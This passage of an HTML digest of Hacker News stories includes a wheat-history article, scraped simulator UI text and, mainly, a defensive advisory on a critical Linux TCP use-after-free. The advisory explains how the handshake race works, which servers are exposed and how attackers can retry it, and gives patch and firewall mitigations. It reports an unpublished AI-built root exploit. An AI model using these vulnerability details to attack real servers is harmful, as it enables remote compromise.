+    Serbia just elected the world&#x27;s brainiest parliament
+  </div>
+
+  <div class="badge reference">
+    REFERENCE
+  </div>
+
+  <div class="meta">
+    799 points ·
+    460 comments ·
+    input_sh
+  </div>
+
+  <div class="meta">
+    science.org
+  </div>
+
+  <div class="meta ranks">
+    Best #2 · Top #31
+  </div>
+
+  <div class="links">
+    <a href="https://www.science.org/content/article/serbia-just-elected-world-s-brainiest-parliament">Original article</a> · <a href="https://news.ycombinator.com/item?id=50314654">HN discussion</a>
+  </div>
+
+  
+<div class="reference-note">
+Full article text was not extracted.
+Use the links above to open the original article
+or Hacker News discussion.
+</div>
+
+</div>
+
+
+<div class="story">
+  <div class="story-title">
+    <span class="number">7.</span>
+    An Italian farmer found some unknown seeds in his attic and planted them
+  </div>
+
+  <div class="badge full-text">
+    FULL TEXT
+  </div>
+
+  <div class="meta">
+    60 points ·
+    22 comments ·
+    ecares
+  </div>
+
+  <div class="meta">
+    smithsonianmag.com
+  </div>
+
+  <div class="meta ranks">
+    Top #2 · New #39
+  </div>
+
+  <div class="links">
+    <a href="https://www.smithsonianmag.com/science-nature/italian-farmer-found-unknown-seeds-attic-with-nothing-lose-planted-them-result-biblical-180989644/">Original article</a> · <a href="https://news.ycombinator.com/item?id=50320963">HN discussion</a>
+  </div>
+
+  
+<div class="body-label">Article</div>
+<div class="article-body">
+<div class="para">Sometime in the early 1990s, Claudio Grossi, a 40-year-old farmer in Parma, in northern Italy, was cleaning his attic when he turned up an old sack full of seeds that he couldn’t identify. The bag, he was sure, had been left by his late great-grandfather, who’d started the farmstead around 1915. Grossi had no idea how long the seeds had been sitting there, deprived of water, soil and sun. Dry and cracked, the kernels looked so old in the palm of his hand that he doubted anything would ever sprout from them. He carried the bag down the stairs, shook the seeds out into a pile of manure and then forgot about them.<br>To his surprise, the seeds soon sprouted a few different types of wheat. One was particularly striking: At six feet high, its plants were about twice as tall as commercial wheat. But the most remarkable feature came when it developed ears—the grain-studded parts at the top of the plant. All of the wheat types Grossi had previously seen grew only one such ear. But the tall wheat grew a full seven ears, always in the same pattern: a long one with six shorties bunched up around it like little fingers. Even the kernels themselves were bigger than those of average wheat. And unlike the typical pale-yellow wheat kernels, they came in a rainbow of colors—yellow, black, red, white and even green, sometimes all on the same stem. Grossi, a grain farmer his whole life, had never seen anything like it. “I thought it was a freak of nature,” he says. He couldn’t find a mention of it in agricultural books.<br>For Grossi, a practicing Catholic, the next insight came from a different book altogether. Leafing through a Bible at church one Sunday, he found a passage in the Book of Genesis describing a stalk with seven ears, in a dream that Joseph interprets for the Pharaoh: “And he slept and dreamed the second time: And, behold, seven ears of grain came up upon one stalk, rank and good. And, behold, seven thin ears and blasted with the east wind sprung up after them. And the seven thin ears devoured the seven rank and full ears.” To Grossi, that sounded just like the mysterious crop in his manure pile.<br>“I connected the dots,” Grossi says. That grain must be really ancient, he thought. And if people were farming this odd-looking wheat in biblical times, why does no one today?<br>Back on his farm, Grossi harvested the grain, milled it into flour and baked a loaf of bread in his kitchen. Compared with commercial wheat, the dough didn’t rise well, but as the loaf sat in the oven, it filled the kitchen with a surprisingly nutty and delicious aroma. Once finished, it had a rich, satisfying taste. “You get these notes of sweetness that you can’t find in regular commercial flour,” he says.<br>Did you know? More miracles of grain in the Bible<br>- In 2 Kings 4:42-44, Elisha multiplies 20 barley loaves in order to feed 100 men—anticipating Jesus’s “Feeding of the 5,000” in the gospels.<br>- In 1 Kings 17:8-16, Elisha helps a widow at Zarephath to outlast a drought and famine with only a handful of flour and a little oil.<br>- In Judges 7:9-15, a Midianite soldier recounts a dream in which a barley loaf tumbles into the camp and overturns a tent. Gideon, the judge and military leader, recognizes the dream as a sign that God will deliver the Midianites into Israel&#x27;s hands.<br>- In 2 Kings 4:38-41, during a famine, someone gathers wild gourds and cuts them into a pot of stew. The diners discover that the stew is dangerous and cry out to Elisha. He calls for flour and throws it into the pot—and the stew becomes miraculously safe to eat.<br>Grossi discovered it had other advantages: It was hardier and more self-sufficient than commercial varieties. It fared better during droughts, growing so tall that it overshadowed the weeds. It didn’t need fertilizer or herbicides. Indeed, it seemed so superior to its industrial cousins that he thought of it no longer as a freak of nature but as a wonder. He dubbed it grano del miracolo—“miracle grain” or “miracle wheat.”<br>Grossi’s discovery came at just the right time. In Italy in the 1990s, a burgeoning slow-food movement aimed to preserve traditional farming practices and promote natural diets.<br>Grossi hoped that miracolo could ride this slow-food wave, becoming both a portal to the past and a passage to a future. Perhaps, he thought, miracolo could help other farmers bring back ancient grains, leading the movement that is changing how we make bread, a staple of the human diet. And today, as climate change makes droughts, heat waves and plant disease outbreaks more frequent and intense, a grain that has shown it can fend for itself would help keep that bread on the table.<br>Farmers began cultivating wheat about 10,000 years ago, in the Fertile Crescent—the area of the Middle East known as the Cradle of Civilization. Thousands of years ago, the hardy and adaptable plant took hold in Europe and Asia. Compared with our modern crops, these ancient wheats were much taller, outperforming other grasses in the field.<br>Over the millennia, humans bred different varieties of wheat, some yielding less grain and others more. As human populations grew, the strains of wheat that brought plentiful harvests became more desirable. That pattern accelerated amid the upheavals of the early 20th century. By the early 1920s, Italy was still recovering from World War I and unable to grow enough grain to sustain itself; the country was importing roughly a third of its wheat. When fascist leader Benito Mussolini became prime minister in 1922, he launched a campaign to “free the Italian people from the slavery of foreign bread,” by pushing for wheat varieties that yielded greater harvests. The Italian government promoted and planted these “elite” varieties, then distributed the seeds to farmers. Named la Battaglia del Grano, or the Battle of Wheat, this campaign became a global model for agrarian development.<br>In the United States, wheat harvests were then still plentiful, but not for long: By the early 1930s, amid unprecedented droughts, American farmers found the land was exhausted. The result was the Dust Bowl, during which the previously fertile soils of the Great Plains turned into a desert. American farmers had to look for more drought-resistant varieties that still yielded enough grain.<br>The midcentury Green Revolution, a movement launched by the American agronomist Norman Borlaug, focused on selective breeding and boosted crop production. This work spread worldwide, feeding countless people. The wheat that was created was indeed more plentiful, yet it came with trade-offs. The petite plants couldn’t always outcompete weeds and were susceptible to disease, so growers used weed killers, fungicides and fertilizer to sustain the crops. Little did they know that these practices would only weaken the health of the soil—while making the wheat even less resilient to changing climate and extreme weather events.<br>In the 1990s, Grossi sensed that anxiety over wheat harvests was building. That’s why, after he grew wheat from those seeds in the attic, he set out to put the hardy ancient grain back on the table. First, he realized he’d have to solve a big problem: Bread made from the wheat leavened poorly, rising only to fall again. In the early 2000s, he began discussing this challenge with an old local baker who shunned modern machines and still kneaded his dough by hand. The baker was intrigued. The two men started experimenting.<br>They tried letting the dough rise in smaller batches, using wicker baskets that were taller and helped the dough keep its shape. Soon, the two found another secret: Less kneading made miracolo leaven even better. “The dough was rising, and it was holding its shape,” Grossi says.<br>One new fan of the bread was Beniamino Perobelli, a student in food science at the University of Parma, who tasted the miracolo bread at a local farmers market and dedicated his undergraduate thesis to investigating its nutritional value. That work bore out what Grossi had already intuited: This wheat was truly ancient—and truly special.<br>Working with the lab of Teofilo Vamerali, then a professor at the University of Parma, Perobelli determined that the grain was Triticum turgidum—literally “swollen wheat” in Latin. Known in English as “poulard wheat,” it had originally evolved in what today are Turkey, Egypt and other nearby Mediterranean countries. And searching agricultural references, Perobelli found that it had been grown in Italy, too, until farmers shifted toward higher-yield commercial varieties. That solved the mystery of the seed bag stashed away in the attic: It had survived because Grossi’s grandfather saved some of the heritage grains.<br>The food scientists found that, compared with modern wheats, grano del miracolo was richer in phosphorus and iron. Moreover, to their surprise, they found that T. turgidum had less gluten than modern wheat. And it packed a lot of lysine and tryptophan, the essential amino acids that serve as proteins’ building blocks. It also had more arginine, an amino acid that children need to grow. “The richness of microelements, minerals, and the greater presence of proteins other than gluten were very pleasant surprises,” says Perobelli, now a corporate social responsibility and sustainability manager with Rigoni di Asiago, an Italian company that produces organic fruit spreads, honey and more.<br>For Grossi, Perobelli’s findings offered scientific proof of his grain’s goodness. He persuaded Molino Grassi, a local organic grain company, to offer the flour to artisanal bakers. Over the next few years, Grossi upped production, so Molino Grassi could sell the flour to restaurants and consumers in Italy and abroad.<br>By the 2010s, traditional recipes were enjoying a renaissance. So were artisanal bakers and pasta makers, who also became more discerning about which grains they used, says Francesco Sottile, an expert in biodiversity of agrosystems at the University of Palermo.<br>Ancient grains aren’t necessarily perfect. For example, Grossi has found that miracolo’s height can be a liability—which may be why it fell out of favor with Mussolini. Heavy winds, rains and hail can make the tall stems flip over before the grain ripens, ruining harvests. But Grossi circumvented the problem by planting miracolo with shorter wheat varieties that provide structural support. “I’m quite happy because I developed something that’s like a discovery,” he says.<br>Relying on a limited number of wheat cultivars, Sottile argues, leaves humanity vulnerable to agricultural disasters: prolonged droughts, extreme heat, new diseases or pests that develop resistance to our chemicals. Diversifying grains reduces the risk—even if some varieties succumb to environmental pressures, others will stand.<br>Sottile shared an example. “I’m based in Sicily,” he says, where 2024 saw “one of the worst droughts in the last 35 to 40 years.” It was so bad that many commercial wheat growers abandoned their fields in April of that year, realizing they wouldn’t be able to reap the seeds they sowed. Sottile was heartened to see a better fate among smaller-batch farmers who grew heritage grains, more resilient to extreme weather.<br>“Most of the farmers who were adopting ancient grains, they were able to collect, to harvest,” Sottile says. The world needs more crop biodiversity, he adds—including more ancient grains like grano del miracolo. By the same token, we need more people like Grossi, who, much like the ancient grain he sows, have the tenacity to make a miracle happen.<br>Stories of gods and grains<br>“Miracle wheat” is hardly the first divine cereal. Across millennia, gods have taught mortals how to earn their bread<br>By Sonja Anderson<br>Greece: While Dionysus provided grapes and Athena was responsible for olives, the goddess Demeter brought grain to the Greeks. In myth, the latter goddess taught farming to a man named Triptolemus (pictured at right), then sent him out on a winged chariot to deliver the knowledge to all of Greece—an episode immortalized on ancient vases.<br>Mesopotamia: Ancient Sumerians of the Fertile Crescent attributed farming to Ashnan, the grain goddess, “whose face is honey-covered / The lady, the procreatress, the vigor of the land,” per an ancient Sumerian poem. In myth, Ashnan and her sibling Lahar, deity of livestock, once drunkenly debated whether grains or sheep were more important. Enlil and Enki, the paramount Sumerian gods, declared Ashnan the winner, saying that without grain—often fed to herds—there could be no sheep.<br>Egypt: Osiris ruled over death and the afterlife but was also a god of fertility, and it was said he taught mankind to cultivate wheat. Ancient Egyptians became famously adept at managing this crop: Their growing seasons regularly produced surpluses, thanks to the Nile’s floods. Some priests honored Osiris by planting grain in earthenware shaped like the god.<br>China: Some ancient Chinese myths trace the country’s agriculture back to one emperor of legend: Shennong, born of a princess and a dragon some 4,000 years ago. The ruler supposedly had a bull’s head and a man’s body and is known as the divine farmer, or emperor of five grains (including rice, millets and wheat). He taught his people how to till their land, expanding the ancient Chinese diet—consisting mainly of meat, clams and wild fruits—to include grains and vegetables.<br>Mexico: Quetzalcoatl was a deity of the Aztec civilization who, according to myth, created the humans of our current era—the Fifth Sun—and their world. He taught people how to carve rocks, dye cotton, read the stars and—most important—grow food. One day, Quetzalcoatl observed a black ant carrying a kernel of corn, turned himself into an ant and followed the insect through a crack in a stone mountain, where he found a trove of maize, beans, peppers and sage. He took a corn kernel, brought it to man and taught him how to plant it.</div>
+</div>
+
+</div>
+
+
+<div class="story">
+  <div class="story-title">
+    <span class="number">8.</span>
+    Show HN: BBRouter – Ben Eater&#x27;s 8-bit computer, simulated on 3D breadboards
+  </div>
+
+  <div class="badge full-text">
+    FULL TEXT
+  </div>
+
+  <div class="meta">
+    2 points ·
+    0 comments ·
+    creack
+  </div>
+
+  <div class="meta">
+    bbrouter.com
+  </div>
+
+  <div class="meta ranks">
+    New #2 · Show HN #2
+  </div>
+
+  <div class="links">
+    <a href="https://bbrouter.com/bbrouter/ben-eater-sap-1">Original article</a> · <a href="https://news.ycombinator.com/item?id=50321522">HN discussion</a>
+  </div>
+
+  
+<div class="body-label">Article</div>
+<div class="article-body">
+<div class="para">A text, a divider (a click a corner; Enter ends it)<br>⌘H<br>The sheets, to go to one<br>⇟ · ⇞<br>The next sheet, the previous one (Page Down, Page Up)<br>⌥⌫<br>Back up to the sheet it&#x27;s in<br>Claude, or another AI app, can open, change and run your projects with you, through BBRouter’s MCP server. Connect it once: it asks you to sign in, then works as you, on your projects only.<br>MCP server address<br>Claude Code<br>Then type /mcp in Claude Code, pick bbrouter and choose Authenticate to sign in.<br>Claude (claude.ai, desktop and mobile)<br>Settings → Connectors → Add custom connector: name it BBRouter, paste the address and click Add, then Connect and sign in.<br>Other apps<br>Any app that takes a remote MCP server (HTTP, with OAuth sign-in): give it the address.<br>Click a button, a part or a hole to point this step at<br>No project open<br>Create a layout, or open one saved on the server.<br>Simulation<br>Controls<br>Nothing to control yet: variable jumpers, hole groups, warnings and the simulation show here.<br>Notes<br>Click anything to pin a note to it.<br>New wire<br>Name sticker<br>Type<br>Jumper<br>Fixed: part of the circuit; carries the net from one end to the other. Variable: moved by hand (a probe, a control line); breaks the net, so each end stays its own.<br>States<br>Gauge<br>Colour<br>Height<br>Crossings<br>Sections<br>Board<br>Part<br>On the schematicNot on the schematic yetTaken off the schematic<br>Parts<br>Link copied<br>This link doesn’t open a project any more<br>Its owner stopped sharing the project, or the link isn’t whole. Ask them for a new one.</div>
+</div>
+
+</div>
+
+
+<div class="story">
+  <div class="story-title">
+    <span class="number">9.</span>
+    Tell HN: X is opening any tweet link in a webview whether you press it or not
+  </div>
+
+  <div class="badge hn-text">
+    HN TEXT
+  </div>
+
+  <div class="meta">
+    38 points ·
+    3 comments ·
+    stillatit
+  </div>
+
+  <div class="meta">
+    news.ycombinator.com
+  </div>
+
+  <div class="meta ranks">
+    Ask HN #2
+  </div>
+
+  <div class="links">
+    <a href="https://news.ycombinator.com/item?id=50312174">HN discussion</a>
+  </div>
+
+  
+<div class="body-label">Article</div>
+<div class="article-body">
+<div class="para">One year after I posted this last time[0], they&#x27;re doing it again. My traffic from X has shot way up from people who only ever viewed a full tweet, without pressing the link inside.<br>[0] https://news.ycombinator.com/item?id=45807775</div>
+</div>
+
+</div>
+
+
+<div class="story">
+  <div class="story-title">
+    <span class="number">10.</span>
+    TCP Use-After-Free: CVE-2026-98432 / CVSS 9.8
+  </div>
+
+  <div class="badge full-text">
+    FULL TEXT
+  </div>
+
+  <div class="meta">
+    281 points ·
+    139 comments ·
+    oger
+  </div>
+
+  <div class="meta">
+    atlasum.net
+  </div>
+
+  <div class="meta ranks">
+    Top #3 · Best #26
+  </div>
+
+  <div class="links">
+    <a href="https://atlasum.net/blog/cve-2026-98432-linux-ipv4-tcp-uaf">Original article</a> · <a href="https://news.ycombinator.com/item?id=50319143">HN discussion</a>
+  </div>
+
+  
+<div class="body-label">Article</div>
+<div class="article-body">
+<div class="para">Overview<br>Linux&#x27;s stable kernels shipped a fix on October 11 and 15, 2026 for CVE-2026-98432, a use-after-free in the IPv4 TCP handshake that a remote, unauthenticated peer can reach. The kernel&#x27;s own CVE Numbering Authority (CNA) scores it CVSS 3.1 9.8, Critical. The fixed releases are 5.10.272, 5.15.223, 6.1.190, 6.6.159, 6.12.113, 6.18.56, 7.2.10, and 7.3, and the bug goes back to Linux 4.4. The upstream fix is a four-line change, but most servers run a distribution&#x27;s kernel, and as of 5:15 PM CDT, October 31, Ubuntu&#x27;s tracker still reads &quot;Vulnerable&quot; for its kernel on every release, and Red Hat, which now rates the bug Critical too, lists RHEL 8, 9, and 10 as affected with no fix.<br>Why it&#x27;s urgent: the bug sits in code every Linux server runs when it accepts an IPv4 TCP connection, before any application sees the connection. Anthropic, whose researcher reported it, says its Claude model wrote a working proof-of-concept exploit that runs commands as root on &quot;Linux servers with a multipath TCP listener,&quot; with no credentials. Go programs open those listeners by default, per the Go Security Team. See the timeline.<br>Key facts<br>| Field | Detail |<br>|---|---|<br>| CVE | CVE-2026-98432, &quot;ipv4: free inet_opt and ireq_opt after an RCU grace period,&quot; issued by the Linux kernel CNA |<br>| Severity | Critical, CVSS 3.1 9.8 ( AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H), the kernel CNA&#x27;s score. Red Hat also rates it Critical, CVSS 3.1 9.8, raised from Important (8.1) on October 30. SUSE rates it important, Ubuntu rates it High, and Oracle and Amazon rate it Important with CVSS 3.1 8.1. |<br>| Weakness | Use-after-free of IPv4 option data during the TCP handshake (the record lists no CWE) |<br>| Impact | Per the CNA&#x27;s scoring notes: kernel heap contents disclosed to the remote peer, kernel memory corruption, or a crash. Red Hat&#x27;s bulletin: a remote, unauthenticated attacker &quot;could exploit a race condition during TCP connection request processing to trigger remote code execution.&quot; |<br>| Fixed in | 7.2.10 and 6.18.56 (Oct 11) · 6.12.113, 6.6.159, 6.1.190, 5.15.223, and 5.10.272 (Oct 15) · 7.3 (Oct 18) |<br>| No fix yet | Ubuntu (every release) and Red Hat Enterprise Linux (RHEL) 8, 9, and 10, as of 5:15 PM CDT, October 31. AlmaLinux&#x27;s fixed kernels are still in testing. Upstream branches that reached end-of-life before 5.10 get no fix. |<br>| Proof of concept | Anthropic says Claude built a remote root exploit for servers with a multipath TCP listener. It hasn&#x27;t published the exploit. |<br>| CVE records | Published on cve.org on October 15. NVD lists it as &quot;Received,&quot; with no analysis of its own, as of 5:15 PM CDT, October 31. |<br>| Credit | Reported by Xinyang Ge of Anthropic. Fixed by Eric Dumazet and reviewed by Kuniyuki Iwashima, per the fix commit. |<br>Who is affected<br>Any Linux kernel from 4.4 on that lacks the fix, whether it serves the network directly or hosts containers: a container runs on the host&#x27;s kernel, so a new image doesn&#x27;t change anything. IPv6 connections aren&#x27;t affected by the main issue; the commit says &quot;IPv6 is not affected by the first issue.&quot;<br>| Release line | Status on Oct 31, 2026 | Fixed in | Released |<br>|---|---|---|---|<br>| 7.3 | Mainline | 7.3 (from 7.3-rc7) | Oct 18, 2026 |<br>| 7.2 | Stable | 7.2.10 | Oct 11, 2026 |<br>| 6.18 | Longterm | 6.18.56 | Oct 11, 2026 |<br>| 6.12 | Longterm | 6.12.113 | Oct 15, 2026 |<br>| 6.6 | Longterm | 6.6.159 | Oct 15, 2026 |<br>| 6.1 | Longterm | 6.1.190 | Oct 15, 2026 |<br>| 5.15 | Longterm | 5.15.223 | Oct 15, 2026 |<br>| 5.10 | Longterm | 5.10.272 | Oct 15, 2026 |<br>| 4.4 – 5.4 | End-of-life upstream | distro fixes only | — |<br>Distribution status<br>Distribution kernels carry backported fixes under their own version numbers, so check the tracker, not the upstream number. As of 5:15 PM CDT, October 31:<br>- Ubuntu: the tracker lists the linux package as &quot;Vulnerable&quot; on every release. On 26.10, 26.04, 24.04, and 22.04 it adds &quot;work in progress&quot; in 7.3.0-10.10, 7.0.0-43.43, 6.8.0-149.149, and 5.15.0-203.213; 20.04, 18.04, and 16.04 show only &quot;Vulnerable.&quot; Many cloud and hardware-enablement kernels are listed the same way, and no Ubuntu Security Notice has been published.<br>- Red Hat: rated Critical, CVSS 3.1 9.8, since October 30. RHEL 8, 9, and 10 and OpenShift Container Platform 4 and 5 are listed as affected, with no fix; RHEL 6 and 7 aren&#x27;t affected (CVE page). Its bulletin, RHSB-2026-016, says &quot;Red Hat is expediting the release of fixes,&quot; gives an nftables mitigation (compared below), and says any product that relies on the RHEL kernel, including RHEL CoreOS, &quot;is also potentially impacted.&quot;<br>- AlmaLinux: fixed kernels for AlmaLinux 8, 9, and 10 (kernel-4.18.0-553.180.2.el8_10, kernel-5.14.0-687.61.2.el9_8, and kernel-6.12.0-211.69.2.el10_2) have been in its testing repository since October 30, ahead of RHEL. AlmaLinux will move them to production after community testing, and its errata don&#x27;t list them yet (announcement).<br>- Debian: fixed in 12 &quot;bookworm&quot; (6.1.190-1, DLA-4841-1, and linux-6.12 6.12.113-1~deb12u1, DLA-4850-1), 13 &quot;trixie&quot; (6.12.113-1, DSA-6568-1), and unstable (tracker).<br>- SUSE: rated important. SUSE Linux Enterprise Server 16.0 (kernel-default 6.12.0-160000.40.1) and the 15 SP4, SP5, and SP6 LTSS kernels are fixed; 15 SP7 is in progress. openSUSE Leap 16.0 is fixed, and Leap 15.6 is listed as affected (CVE page).<br>- Oracle Linux: rated Important, CVSS 3.1 8.1. Unbreakable Enterprise Kernel (UEK) errata for Oracle Linux 7, 8, 9, and 10 came out October 16: ELSA-2026-500397, ELSA-2026-500398, and ELSA-2026-500399 (CVE page). The page lists only the UEK kernels.<br>- Amazon Linux: rated Important, CVSS 3.1 8.1, and every kernel is fixed. On Amazon Linux 2023, the default kernel (ALAS2023-2026-3365, October 30), kernel6.12 (ALAS2023-2026-3335, October 29), and kernel6.18 (ALAS2023-2026-3251, October 24). On Amazon Linux 2, the core kernel (ALAS2-2026-4065) and the 5.4, 5.10, and 5.15 Extras kernels (ALAS2KERNEL-5.4-2026-135, ALAS2KERNEL-5.10-2026-137, and ALAS2KERNEL-5.15-2026-120), all October 30 (CVE page).<br>How the vulnerability works<br>When a Linux server accepts a TCP connection, the kernel tracks the half-open handshake in a lightweight &quot;request socket,&quot; then creates a full socket once the handshake completes. If the connecting peer&#x27;s IPv4 header carried options, the kernel keeps them to echo in its replies. The bug: the kernel handed those saved options from the request socket to the new connection without copying them, then freed them immediately when the connection went away, while another CPU could still be reading them to build a handshake reply. Reading freed kernel memory is a use-after-free.<br>The peer needs no login, and it all happens inside the kernel&#x27;s handshake handling, before any application code runs. The CNA&#x27;s scoring notes say the stale data can leak kernel heap memory back to the peer, steer kernel writes out of bounds, or crash the machine. Anthropic says a lost race &quot;only fails the handshake without crashing the whole system, so a determined attacker can retry indefinitely until they succeed.&quot;<br>The fix<br>Eric Dumazet&#x27;s commit, &quot;ipv4: free inet_opt and ireq_opt after an RCU grace period,&quot; changes two plain kfree() calls to kfree_rcu(), which waits until every reader has finished with the memory before freeing it. Other code paths that replace these options already did that. The commit also fixes the same problem in request-socket migration (net.ipv4.tcp_migrate_req=1, or a BPF_SK_REUSEPORT_SELECT_OR_MIGRATE program), and says a related IPv6 case &quot;will be addressed in a separate patch.&quot;<br>Which servers are exposed<br>- Every Linux host that accepts IPv4 TCP connections on an affected kernel: web servers, SSH, databases, load balancers, and Kubernetes nodes. The CNA&#x27;s notes say the vulnerable path runs &quot;during the TCP handshake, before application authentication.&quot;<br>- Hosts with a multipath TCP (MPTCP) listener first. That&#x27;s the setup Anthropic&#x27;s working exploit needs: &quot;Linux servers with a multipath TCP listener.&quot; Anthropic hasn&#x27;t said why that listener matters, and the CVE record doesn&#x27;t mention MPTCP. A server has one only if an application opens an MPTCP socket, and Go programs do by default: the Go Security Team says &quot;as of Go 1.24, Go programs enable MPTCP by default for listen sockets on Linux.&quot; The default follows the go line in the program&#x27;s go.mod, and applies only where the kernel allows MPTCP (net.mptcp.enabled = 1, as on the Debian 12 kernel we checked; AlmaLinux says it ships MPTCP off). The Go team adds that &quot;the underlying bug is not specific to MPTCP. It is possible that systems with no MPTCP listeners are vulnerable to similar attacks.&quot; The check is below.<br>Red Hat now rates it as the CNA does. It raised the bug from Important (8.1) to Critical (9.8) on October 30, citing &quot;the lack of network prerequisites and the potential for severe system instability.&quot; Its bulletin says &quot;Systems accepting inbound TCP connections are most directly exposed.&quot;<br>How to check your systems<br>Check the kernel<br>Compare the result with your distribution&#x27;s status above, not with the upstream version. If the installed kernel is newer than the running one, the fix isn&#x27;t active until you reboot. Run these on container hosts and Kubernetes nodes, not inside containers: a container reports the host&#x27;s kernel. We ran them on a Debian 12 host and in a Rocky Linux 9 container.<br>Check for multipath TCP listeners<br>ss -M lists only MPTCP sockets, so an empty result means no MPTCP listener. net.mptcp.enabled = 1 alone doesn&#x27;t create one: an application has to open an MPTCP socket. We tested both with iproute2 6.1 in a Debian 12 container, where ss -Mlnp listed a test MPTCP listener and skipped a plain TCP one beside it. On October 31 it also listed a Go HTTP server whose go.mod says go 1.24, and skipped the same server built with go 1.23.<br>How to fix<br>Update the kernel and reboot<br>Install your distribution&#x27;s fixed kernel as soon as it ships, then reboot: a kernel update doesn&#x27;t take effect until the machine boots into it. Reboot container hosts and Kubernetes nodes too. Appliances and cloud images that bundle a kernel need their vendor&#x27;s update.<br>On Debian, SUSE Linux Enterprise Server 16.0 and the 15 LTSS releases, openSUSE Leap 16.0, Oracle Linux&#x27;s UEK kernels, and Amazon Linux 2 and 2023, the fix is out. AlmaLinux&#x27;s is in its testing repository. On Ubuntu and RHEL, it isn&#x27;t out yet, as of 5:15 PM CDT, October 31. Watch the trackers linked above. Running a self-built kernel? Move to the fixed stable release for its line.<br>If you can&#x27;t patch yet<br>Red Hat&#x27;s bulletin and AlmaLinux now publish nftables rules that drop incoming IPv4 TCP packets carrying IP options. Red Hat says its rule &quot;reduces exposure to this vulnerability but cannot fully prevent it.&quot; The following is Atlas&#x27;s interim recommendation, the same rule as AlmaLinux&#x27;s, based on the CNA&#x27;s scoring notes, which say the attacking peer supplies IPv4 Record Route or Timestamp options in its SYN. TCP traffic almost never carries IPv4 options legitimately, so dropping TCP packets that have them should cost nothing:<br>ip hdrlength gt 5 matches any IPv4 header longer than the 20-byte minimum, which only options produce. The rule runs before connection tracking and doesn&#x27;t touch IPv6 or non-TCP traffic. We tested it in a Debian 12 container: it dropped a SYN carrying a Record Route option, and ordinary TCP connections still worked. We haven&#x27;t tested it against an exploit, and it doesn&#x27;t fix the kernel. It lasts until reboot, which is fine if the reboot is into a fixed kernel; remove it with nft delete table ip cve_2026_98432. If your edge firewall can drop IPv4 packets with options, doing it there protects every host behind it.<br>If you manage the firewall with iptables, this rule does the same job from the raw table, which also runs before connection tracking:<br>The u32 match reads the IPv4 header-length field, and a value of 6 to 15 means the header carries options. We tested it with iptables 1.8.9, on both its nf_tables and legacy backends, in a Debian 12 container: it dropped a Record Route SYN sent to the host and one routed through it, and ordinary TCP connections still worked. Remove it by running the same command with -D in place of -I; like the nft rule, it lasts until reboot. It needs the kernel&#x27;s xt_u32 module, which the Debian 12, Ubuntu 22.04 and 24.04, and RHEL 8 kernels include. RHEL 9 and 10 kernels, and their rebuilds, leave it out, so use the nft rule there.<br>Red Hat&#x27;s rule hooks input; ours hooks prerouting, so it also drops packets the host routes on to containers. On October 31 we tested it against two pairs of network namespaces. It dropped a Record Route SYN routed between one pair, and never saw one bridged between the other, as AlmaLinux warns: &quot;Traffic between containers on the same host may bypass it.&quot; AlmaLinux also says not to use it on networks that rely on CIPSO security labels, which travel in IPv4 options.<br>Turn off multipath TCP if you don&#x27;t use it. That removes the setup Anthropic&#x27;s exploit needs, though not the bug. AlmaLinux&#x27;s steps:<br>New MPTCP sockets then fail, and Go programs fall back to plain TCP when they start. The setting is per network namespace, and each new one starts with MPTCP on, so a container keeps it unless you set it there too (Docker: --sysctl net.mptcp.enabled=0). We tested the steps and the Docker flag on October 31. For a single Go program, GODEBUG=multipathtcp=0 in its environment turns the default off, but the Go Security Team calls disabling MPTCP program by program &quot;a fragile mitigation.&quot;<br>Until you can patch, keep MPTCP listeners off the internet, and put the hosts that have one at the top of the patch list.<br>Timeline and exploitation status<br>All times are CDT (UTC−5).<br>| When | What |<br>|---|---|<br>| Oct 1 · 5:12 PM | Eric Dumazet posts the fix, crediting Xinyang Ge of Anthropic as reporter |<br>| Oct 5 | The fix is merged into the kernel&#x27;s networking tree |<br>| Oct 11 | Linux 7.2.10 and 6.18.56 ship the fix; 7.3-rc7 follows that night |<br>| Oct 15 · 4:56–7:16 AM | Linux 6.12.113, 6.6.159, 6.1.190, 5.15.223, and 5.10.272 ship the fix; the CVE record is published at 7:08 AM |<br>| Oct 16 | Oracle publishes UEK errata with the fix for Oracle Linux 7 through 10 |<br>| Oct 18 | Linux 7.3 is released with the fix |<br>| Oct 24 | Amazon Linux 2023&#x27;s kernel6.18 package is fixed |<br>| Oct 27 | Anthropic&#x27;s Frontier Red Team describes a remote root exploit for the bug, built by Claude in its lab |<br>| Oct 29 · 6:34 PM | The Go Security Team says Go programs have opened MPTCP listeners by default since Go 1.24 |<br>| Oct 29 | Ubuntu still lists its kernels as vulnerable; Amazon Linux 2023&#x27;s kernel6.12 package is fixed; GitHub repositories referencing the CVE appear, one created at 7:22 PM describing a race trigger |<br>| Oct 30 | AlmaLinux puts fixed kernels in its testing repository; Red Hat raises its rating to Critical and publishes bulletin RHSB-2026-016 with a mitigation; Amazon Linux fixes its remaining kernels |<br>| Oct 31 | 36 GitHub repositories reference the CVE, at least six describing a race trigger or a proof of concept |<br>Exploitation status. Anthropic says Claude wrote the exploit &quot;after initial prompting,&quot; that it runs &quot;arbitrary commands as root, without any credentials or user interaction&quot; on servers with a multipath TCP listener, and that in its proof of concept &quot;it takes 48 minutes to leak a kernel pointer and another five minutes to reach the shell command execution.&quot; Anthropic hasn&#x27;t published the exploit. Its disclosure policy gives developers 90 days to patch and a further 45 days before Anthropic discusses details beyond a public advisory. Red Hat&#x27;s bulletin now says the bug could be exploited &quot;to trigger remote code execution.&quot; By 5:15 PM CDT on October 31, 36 GitHub repositories referenced the CVE. Most describe themselves as audit or mitigation tooling, among them Ansible roles and a livepatch for AlmaLinux and Rocky Linux. At least six say they include a race trigger or a proof of concept for the use-after-free; the first was created at 7:22 PM on October 29, and the latest at 11:04 AM on October 31. The CVE isn&#x27;t in CISA&#x27;s Known Exploited Vulnerabilities catalog as of 5:15 PM CDT. We haven&#x27;t tested any public proof of concept, and we aren&#x27;t linking them.<br>Updates to this post<br>We&#x27;ll revise this post and mark it updated when any of these change: fixed kernels from Ubuntu or Red Hat, or AlmaLinux&#x27;s production release; NVD&#x27;s analysis; a KEV listing or any report of exploitation; the separate IPv6 fix.<br>- October 31, 5:15 PM CDT: Red Hat raised its rating from Important (8.1) to Critical (9.8) on October 30 and published a mitigation in bulletin RHSB-2026-016, so we replaced its earlier rating and its &quot;no mitigation&quot; statement. Added the Go Security Team&#x27;s notice that Go programs open MPTCP listeners by default, AlmaLinux&#x27;s fixed kernels in testing, Amazon Linux&#x27;s fixes for its remaining kernels, openSUSE Leap 16.0&#x27;s fix, steps to turn off MPTCP, an iptables version of the interim rule, and the interim rule&#x27;s 